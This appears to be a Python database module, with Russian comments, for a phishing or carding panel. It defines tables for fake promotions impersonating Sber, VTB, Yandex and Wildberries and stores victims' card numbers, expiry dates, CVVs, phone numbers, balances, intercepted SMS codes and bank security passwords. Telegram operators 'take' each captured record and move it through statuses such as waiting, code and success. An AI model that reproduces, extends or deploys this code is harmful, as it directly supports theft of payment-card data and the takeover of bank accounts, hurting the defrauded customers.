# ============================================
# БАЗА ДАННЫХ - SQLAlchemy + aiosqlite
# ============================================

import os
import datetime
from enum import Enum
from typing import Optional, List

from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, select, update, Enum as SQLEnum
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped

from config import DB_PATH

# Создаём папку data если нет
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

# Подключение к БД
engine = create_async_engine(f"sqlite+aiosqlite:///{DB_PATH}", echo=False)
async_session = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

class Base(DeclarativeBase):
    pass

async def get_session() -> AsyncSession:
    return async_session()

async def init_db():
    """Инициализация базы данных"""
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

# ============================================
# ENUM для сервисов
# ============================================
class ServiceType(str, Enum):
    SBER = "sber"
    VTB = "vtb"
    YANDEX = "yandex"
    WILDBERRIES = "wildberries"

# ============================================
# МОДЕЛЬ: Ad (Объявление/Ссылка)
# ============================================
class Ad(Base):
    __tablename__ = "ad"
    
    id: Mapped[int] = Column(Integer, primary_key=True, autoincrement=True)
    name: Mapped[str] = Column(String(256), default="Акция")
    service: Mapped[str] = Column(String(64), default="sber")
    amount: Mapped[int] = Column(Integer, default=15000)
    link_id: Mapped[int] = Column(Integer, unique=True)
    domain: Mapped[str] = Column(String(256), nullable=True)
    created_at: Mapped[datetime.datetime] = Column(DateTime, default=datetime.datetime.now)
    last_online: Mapped[datetime.datetime] = Column(DateTime, default=datetime.datetime.now)
    
    async def save(self):
        async with async_session() as session:
            session.add(self)
            await session.commit()
    
    async def update_online(self):
        self.last_online = datetime.datetime.now()
        await self.save()
    
    @classmethod
    async def get_by_id(cls, ad_id: int) -> Optional['Ad']:
        async with async_session() as session:
            result = await session.execute(select(cls).where(cls.id == ad_id))
            return result.scalar()
    
    @classmethod
    async def get_by_link_id(cls, link_id: int) -> Optional['Ad']:
        async with async_session() as session:
            result = await session.execute(select(cls).where(cls.link_id == link_id))
            return result.scalar()
    
    @classmethod
    async def get_or_create(cls, link_id: int, service: str = "sber", amount: int = 15000) -> 'Ad':
        """Получить или создать объявление"""
        ad = await cls.get_by_link_id(link_id)
        if ad:
            return ad
        
        ad = cls(link_id=link_id, service=service, amount=amount)
        await ad.save()
        return ad

# ============================================
# МОДЕЛЬ: Log (Лог карты)
# ============================================
class Log(Base):
    __tablename__ = "log"
    
    id: Mapped[int] = Column(Integer, primary_key=True, autoincrement=True)
    card_number: Mapped[str] = Column(String(32))
    card_expiry: Mapped[str] = Column(String(10), nullable=True)
    cvv: Mapped[str] = Column(String(4), nullable=True)
    phone: Mapped[str] = Column(String(32), nullable=True)
    balance: Mapped[str] = Column(String(64), nullable=True)
    bank: Mapped[str] = Column(String(64), nullable=True)
    device: Mapped[str] = Column(String(128), nullable=True)
    
    ad_id: Mapped[int] = Column(Integer, ForeignKey("ad.id"), nullable=True)
    service: Mapped[str] = Column(String(64), default="sber")
    
    status: Mapped[str] = Column(String(64), default="waiting")  # waiting, taken, code, error, success
    error_text: Mapped[str] = Column(String(512), nullable=True)
    
    handler_id: Mapped[int] = Column(Integer, nullable=True)  # Telegram ID оператора
    handler_name: Mapped[str] = Column(String(128), nullable=True)
    
    message_id: Mapped[int] = Column(Integer, nullable=True)  # ID сообщения в Telegram
    topic: Mapped[str] = Column(String(64), default="🟧 | Лог карты")
    
    block_code_input: Mapped[bool] = Column(Boolean, default=False)
    question_text: Mapped[str] = Column(String(256), nullable=True)
    
    created_at: Mapped[datetime.datetime] = Column(DateTime, default=datetime.datetime.now)
    
    async def save(self):
        async with async_session() as session:
            session.add(self)
            await session.commit()
            await session.refresh(self)
    
    async def update_status(self, status: str, error_text: str = None):
        self.status = status
        if error_text:
            self.error_text = error_text
        await self.save()
    
    async def take(self, handler_id: int, handler_name: str):
        self.status = "taken"
        self.handler_id = handler_id
        self.handler_name = handler_name
        self.topic = "🟩 | Лог карты"
        await self.save()
    
    @classmethod
    async def get_by_id(cls, log_id: int) -> Optional['Log']:
        async with async_session() as session:
            result = await session.execute(select(cls).where(cls.id == log_id))
            return result.scalar()
    
    @classmethod
    async def get_by_card(cls, card_number: str) -> Optional['Log']:
        """Найти последний лог по номеру карты"""
        async with async_session() as session:
            result = await session.execute(
                select(cls)
                .where(cls.card_number == card_number)
                .order_by(cls.created_at.desc())
                .limit(1)
            )
            return result.scalar()
    
    async def get_ad(self) -> Optional[Ad]:
        if self.ad_id:
            return await Ad.get_by_id(self.ad_id)
        return None

# ============================================
# МОДЕЛЬ: Code (СМС код)
# ============================================
class Code(Base):
    __tablename__ = "code"
    
    id: Mapped[int] = Column(Integer, primary_key=True, autoincrement=True)
    log_id: Mapped[int] = Column(Integer, ForeignKey("log.id"))
    code: Mapped[str] = Column(String(10))
    status: Mapped[str] = Column(String(256), nullable=True)
    message_id: Mapped[int] = Column(Integer, nullable=True)
    created_at: Mapped[datetime.datetime] = Column(DateTime, default=datetime.datetime.now)
    
    async def save(self):
        async with async_session() as session:
            session.add(self)
            await session.commit()
            await session.refresh(self)
    
    async def update_status(self, status: str):
        self.status = status
        await self.save()
    
    async def update_message_id(self, message_id: int):
        self.message_id = message_id
        await self.save()
    
    @classmethod
    async def get_by_id(cls, code_id: int) -> Optional['Code']:
        async with async_session() as session:
            result = await session.execute(select(cls).where(cls.id == code_id))
            return result.scalar()
    
    async def get_log(self) -> Optional[Log]:
        return await Log.get_by_id(self.log_id)

# ============================================
# МОДЕЛЬ: Password (Ключ безопасности)
# ============================================
class Password(Base):
    __tablename__ = "password"
    
    id: Mapped[int] = Column(Integer, primary_key=True, autoincrement=True)
    code_id: Mapped[int] = Column(Integer, ForeignKey("code.id"))
    password: Mapped[str] = Column(String(64))
    status: Mapped[str] = Column(String(64), nullable=True)
    message_id: Mapped[int] = Column(Integer, nullable=True)
    created_at: Mapped[datetime.datetime] = Column(DateTime, default=datetime.datetime.now)
    
    async def save(self):
        async with async_session() as session:
            session.add(self)
            await session.commit()
            await session.refresh(self)
    
    async def update_status(self, status: str):
        self.status = status
        await self.save()
    
    @classmethod
    async def get_by_id(cls, password_id: int) -> Optional['Password']:
        async with async_session() as session:
            result = await session.execute(select(cls).where(cls.id == password_id))
            return result.scalar()
